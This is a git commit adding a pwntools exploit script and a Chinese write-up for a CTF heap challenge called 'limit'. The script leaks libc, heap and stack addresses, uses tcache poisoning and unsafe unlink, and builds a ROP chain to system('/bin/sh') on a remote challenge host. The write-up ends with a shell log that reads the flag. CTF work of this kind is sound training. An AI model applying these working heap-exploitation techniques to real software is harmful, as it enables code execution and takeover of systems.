dad049584ffdfc0f0e3da79905313498428f64ee
thj <thj8@163.com>
2025-06-18 17:19:20 +0800

    smile limit

---
+++ tasks/2025/simple/limit/exp.py
@@ -0,0 +1,182 @@
+from pwn import *
+
+context.log_level = "debug"
+context.arch = "amd64"
+context.os = "linux"
+context.terminal = ["/usr/bin/tmux", "sp", "-h"]
+
+f_remote = True if "remote" in sys.argv else False
+f_gdb = True if "gdb" in sys.argv else False
+
+vuln_path = "./limit"
+elf = ELF(vuln_path)
+libc = elf.libc
+
+io = process([vuln_path]) if not f_remote else remote("smiley.cat", 46465)
+
+
+def ddebug(b=""):
+    if not f_gdb:
+        return
+    gdb.attach(io, gdbscript=b)
+    pause()
+
+
+p_chunk = 0x4040
+p_size = 0x404c
+
+
+def create(idx, size):
+    io.sendlineafter("> ", "1")
+    io.sendlineafter("Index: ", str(idx))
+    io.sendlineafter("Size: ", str(size))
+
+
+def delete(idx):
+    io.sendlineafter("> ", "2")
+    io.sendlineafter("Index: ", str(idx))
+
+
+def edit(idx, data):
+    io.sendlineafter("> ", "4")
+    io.sendlineafter("Index: ", str(idx))
+    io.sendafter("Data: ", data)
+
+
+def show(idx):
+    io.sendlineafter("> ", "3")
+    io.sendlineafter("Index: ", str(idx))
+
+
+# 常规泄漏libc， heap
+for i in range(9):
+    create(i, 0xf0)
+
+create(0xf, 0x10)
+for i in range(9):
+    delete(i)
+
+for i in range(7):
+    create(i, 0xf0)
+
+create(7, 0xf0)
+create(8, 0xf0)
+show(7)
+main_arena = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
+libc.address = main_arena - 0x203d10
+log.success("lic.address:-----> " + hex(libc.address))
+show(8)
+heap = u64(io.recvuntil("\x05")[-5:].ljust(8, b"\x00"))
+heap = heap << 12
+log.success("heap:-----> " + hex(heap))
+
+# 制造叠堆，使2个指针指向同一地址
+create(0, 0xf8)
+create(1, 0xf8)
+create(2, 0xf8)
+create(3, 0xf8)
+edit(0, p64(0)+p64(0x2f1) + p64((heap+0xbc0)) * 2)
+edit(2, b"t"*0xf0+p64(0x2f0))
+
+for i in range(7):
+    create(i+4, 0xf8)
+
+for i in range(7):
+    delete(i+4)
+
+delete(3)  # 假chunk0-3 一起进入unsortedbin
+
+create(4, 0x68)
+create(4, 0x78)
+create(5, 0x18)     # chunk1, chunk5同样的地址
+
+# 泄漏栈，通过libc_argv
+create(6, 0x18)
+delete(6)
+libc_argv = libc.symbols["__libc_argv"]
+log.success("libc_argv:-----> " + hex(libc_argv))
+delete(5)
+edit(1, p64(libc_argv ^ (heap+0xce0) >> 12))
+create(5, 0x18)
+create(6, 0x18)
+delete(5)
+show(1)
+v = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
+stack = heap >> 12 ^ libc_argv >> 12 ^ v
+log.success("leak stack:-----> " + hex(stack))
+create(5, 0x18)
+
+# 泄漏程序基地址
+create(6, 0x18)
+delete(6)
+leak_addr = stack - 0x48
+log.success("leak_addr:-----> " + hex(leak_addr))
+delete(5)
+edit(1, p64(leak_addr ^ (heap+0xce0) >> 12))
+create(5, 0x18)
+create(6, 0x18)
+delete(5)
+show(1)
+v = u64(io.recvuntil("\x55")[-6:].ljust(8, b"\x00"))
+ebase = heap >> 12 ^ leak_addr >> 12 ^ v
+ebase -= 0x1160
+log.success("ebase:-----> " + hex(ebase))
+create(5, 0x18)
+
+
+# 清空tcache
+for i in range(10):
+    create(0, 0xf8)
+
+# unsafe unlink
+create(0, 0xf8)
+create(1, 0xf8)
+create(2, 0xf8)
+create(3, 0xf8)
+create(4, 0xf8)
+create(5, 0xf8)
+
+ptr_addr = ebase + 0x4040
+fd = ptr_addr - 0x18
+bk = ptr_addr - 0x10
+payload = p64(0)+p64(0x4f1)
+payload += p64(fd)+p64(bk)
+edit(0, payload)
+
+payload = b"a" * 0xf0 + p64(0x4f0)
+edit(4, payload)
+for i in range(7):
+    create(i+8, 0xf8)
+
+for i in range(7):
+    delete(i+8)
+# ddebug("b malloc\n b free\n continue")
+delete(5)
+
+
+# read返回值相对于上面泄漏的stack偏移
+read_ret_stack_offset = 0x7ffeff81c4b8 - 0x7ffeff81c348  # 0x170
+read_ret_addr = stack - read_ret_stack_offset
+log.success("read_ret:-----> " + hex(read_ret_addr))
+payload = p64(0)
+payload += p64(libc.symbols["_IO_2_1_stdin_"])
+payload += p64(0)
+payload += p64(read_ret_addr)
+edit(0, payload)
+
+"""
+0x000000000010f75b : pop rdi ; ret
+"""
+system_addr = libc.symbols.get("system")
+binsh_addr = next(libc.search("/bin/sh"))
+payload = p64(libc.address + 0x000000000010f75b)
+payload += p64(binsh_addr)
+# payload += p64(ebase + 0x17b4)
+# payload += p64(0)
+payload += p64(libc.address + 0x2882f)
+payload += p64(system_addr)
+ddebug(f"b *{libc.address+0x000000000010f75b} \ncontinue")
+edit(0, payload)
+
+
+io.interactive()
---
+++ tasks/2025/simple/limit/readme.md
@@ -0,0 +1,89 @@
+# 思路
+## 常规泄漏heap，libc
+- 1. tcache打满
+- 2. free后进unsortbin
+- 3. create(p1), create(p2)
+- 4. show(p1)泄漏libc，存放main_arena偏移
+- 5. show(p2)泄漏heap, 存放heap偏移
+
+## 任意地址读写
+### 常规方法
+- 1. 通过叠堆，制造两个chunk指向同一处，p1,p2
+- 2. malloc(p3, 0x18), free(p3), free(p1)
+- 3. edit(p2, address^heap>>12)     # 改写tcache的fd
+- 4. mallocp1, 0x18), malloc(p2, 0x18) 
+- 5. read(p2), write(p2)    
+
+此时的chunk指向address，我们刚刚在第3步写入的地址
+
+### 本题方法
+此题中有这段代码，不能超过堆地址, 所以想通过`__libc_argv`或者`environ`来泄漏栈行不通
+```
+chunks[idx] = malloc(sz);
+if (chunks[idx] > limit) {
+    puts("hey where do you think ur going");
+    // if (malloc_usable_size(chunks[idx])) free(chunks[idx])
+    chunks[idx] = 0;
+    break;
+}
+```
+
+通过修改，能够`任意地址读的作用`, 方法如下
+- 1. 通过叠堆，制造两个chunk指向同一处，p1,p2
+- 2. malloc(p3, 0x18), free(p3), free(p1)   # 3个chunk大小要一致
+- 3. edit(p2, address^heap>>12)     # 改写tcache的fd
+- 4. malloc(p1, 0x18), malloc(0x18)  # 第一个malloc赋给p1
+- 5. free(p1)
+- 6. read(p2) 
+
+内存值为：read(p2) ^ (heap >>12) ^ (address ^ 12)?
+
+### why 内存值为：read(p2) ^ (heap >>12) ^ (address ^ 12)??
+```
+p1 的next计算方法：
+1. next = address >> 12 ^  [address]
+2. next = heap >> 12 ^ read(p)
+```
+
+```
+>>> hex(0x56441f4f9cc0 >> 12 ^  0x7ffde39e91d5 ^ 0x7ff5c58f46e0 >>12)
+'0x7fff78833dd8'
+```
+![](https://r2.20161023.xyz/pic/20250618142043832.png)
+![](https://r2.20161023.xyz/pic/20250618142123744.png)
+
+# debug
+usable_size比真实size要大
+```
+uint16_t usable_size = sz > 0x18 ? (sz+7&~0xf)+8 : 0x18;
+sizes[idx] = usable_size;
+```
+
+## main_arena
+0x7f5868dfad10 - 0x7f5868bf7000 = 0x203d10
+
+# getshell
+本地exp能出，在国内打远程服务器太慢，超时被断开，需要在国外vps运行
+```
+[DEBUG] Sent 0x20 bytes:
+    00000000  5b f7 05 27  5f 7f 00 00  2f b4 11 27  5f 7f 00 00  │[··'│_···│/··'│_···│
+    00000010  2f 88 f7 26  5f 7f 00 00  50 87 fa 26  5f 7f 00 00  │/··&│_···│P··&│_···│
+    00000020
+[*] Switching to interactive mode
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0xd bytes:
+    b'flag.txt\n'
+    b'run\n'
+flag.txt
+run
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[DEBUG] Received 0x7c bytes:
+    b'.;,;.{1_am_4_f1ag_gr3nad3_I_am_a_f14g_gren4d3_I_4m_4_fl4g_gr3nade_aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9wL0RJZUg3alRwaXdNLw==}\n'
+.;,;.{1_am_4_f1ag_gr3nad3_I_am_a_f14g_gren4d3_I_4m_4_fl4g_gr3nade_aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9wL0RJZUg3alRwaXdNLw==}
+$
+```
+![](https://r2.20161023.xyz/pic/20250618170726189.png)
